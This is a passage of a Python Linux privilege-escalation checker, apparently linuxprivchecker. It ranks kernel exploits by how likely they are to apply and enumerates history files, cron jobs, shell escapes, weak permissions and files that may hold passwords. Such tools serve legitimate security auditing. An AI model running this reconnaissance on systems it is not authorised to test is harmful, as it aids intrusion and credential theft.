        # first check for kernell applicability
        if (version >= sploits[sploit]["minver"]) and (version <= sploits[sploit]["maxver"]):
            # next check language applicability
            if (sploits[sploit]["lang"] == "c") and (("gcc" in str(langs)) or ("cc" in str(langs))):
                lang = 1  # language found, increase applicability score
            elif sploits[sploit]["lang"] == "sh":
                lang = 1  # language found, increase applicability score
            elif sploits[sploit]["lang"] in str(langs):
                lang = 1  # language found, increase applicability score
            if lang == 0:
                sploitout = sploitout + "**"  # added mark if language not detected on system
            # next check keyword matches to determine if some sploits have a higher probability of success
            for loc in sploits[sploit]["keywords"]["loc"]:
                if loc == "proc":
                    for proc in procs:
                        if keyword in proc:
                            highprob.append(
                                sploitout)  # if sploit is associated with a running process consider it a higher probability/applicability
                            break
                elif loc == "os":
                    if (keyword in os) or (keyword in kernel):
                        highprob.append(
                            sploitout)  # if sploit is specifically applicable to this OS consider it a higher probability/applicability
                        break
                elif loc == "mnt":
                    if keyword in mount:
                        highprob.append(
                            sploitout)  # if sploit is specifically applicable to a mounted file system consider it a higher probability/applicability
                        break
                else:
                    avgprob.append(
                        sploitout)  # otherwise, consider average probability/applicability based only on kernel version

    print("    Note: Exploits relying on a compile/scripting language not detected on this system are marked with a '**' but should still be tested!")
    print()

    print()
    "    The following exploits are ranked higher in probability of success because this script detected a related running process, OS, or mounted file system"
    for exploit in highprob:
        print("    - " + exploit)
    print()

    print("    The following exploits are applicable to this kernel version and should be investigated as well")
    for exploit in avgprob:
        print("    - " + exploit)

def run_check():

    try:
        import argparse
        import sys

        # Parse out all of the command line arguments
        parser = argparse.ArgumentParser(description='Try to gather system information and find likely exploits')
        parser.add_argument('-s', '--searches', help='Skip time consumming or resource intensive searches', required=False, action='store_true')
        parser.add_argument('-w', '--write', help='Wether to write a log file, can be used with -0 to specify name/location ', required=False, action='store_true')
        parser.add_argument('-o', '--outfile', help='The file to write results (needs to be writable for current user)', required=False, default='linuxprivchecker.log')
        args = parser.parse_args()

        if args.searches:
            processsearches = False
        else:
            processsearches = True

        # if write is requeted, create a custom logger to send stout to log file as well
        if args.write:
            # import sys for io redirection
            import sys

            class Logger(object):
                def __init__(self):
                    self.terminal = sys.stdout
                    self.log = open(args.outfile, 'a')

                def write(self, message):
                    self.terminal.write(message)
                    self.log.write(message)
            sys.stdout = Logger()

    except ImportError:
        print('Arguments could not be processed, defaulting to print everything')
        processsearches = True

    # title / formatting
    bigline = "======================================================================================="
    print(bigline)
    print("""
        __    _                  ____       _       ________              __
       / /   (_)___  __  ___  __/ __ \_____(_)   __/ ____/ /_  ___  _____/ /_____  _____
      / /   / / __ \/ / / / |/_/ /_/ / ___/ / | / / /   / __ \/ _ \/ ___/ //_/ _ \/ ___/
     / /___/ / / / / /_/ />  </ ____/ /  / /| |/ / /___/ / / /  __/ /__/ ,< /  __/ /
    /_____/_/_/ /_/\__,_/_/|_/_/   /_/  /_/ |___/\____/_/ /_/\___/\___/_/|_|\___/_/

    """)
    print(bigline)

    # Enumerate Basic User Information
    userinfo = enum_user_info()

    # Enumerate Basic System Information
    sysinfo = enum_system_info()

    # Enumerate Basic Network Information
    enum_network_info()

    # Enumerate User History Files
    enum_user_history_files()

    # Enumerate Basic RC Files
    enum_rc_files()

    # Enumerate Basic Filesystem Information
    driveinfo = enum_filesystem_info()

    # Enumerate List of all Cron jobs
    enum_cron_jobs()

    # Enumerate Package and Process information
    pkgsandprocs = enum_procs_pkgs(sysinfo)

    # Enumerate Possible Root/superuser packages or processes
    enum_root_pkg_proc(pkgsandprocs, userinfo)

    # Emumerate Available Development Tools
    devtools = enum_dev_tools()

    # Enumerate Possible Shell Escapes
    enum_shell_esapes(devtools)

    find_likely_exploits(sysinfo, devtools, pkgsandprocs, driveinfo)

    if processsearches:
        # Search for Insecure File/Folder Permissions
        search_file_perms()

        # Search for files with potential credentials
        search_file_passwords()

    print("Finished")
    print(bigline)
